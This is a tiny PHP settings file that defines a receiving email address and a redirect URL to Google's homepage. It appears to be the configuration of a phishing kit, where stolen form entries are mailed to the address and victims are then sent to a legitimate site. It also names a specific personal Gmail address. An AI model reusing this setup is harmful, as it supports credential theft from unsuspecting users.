<?php 
$Receive_email="mountalex54@gmail.com";
$redirect="https://www.google.com/";
?>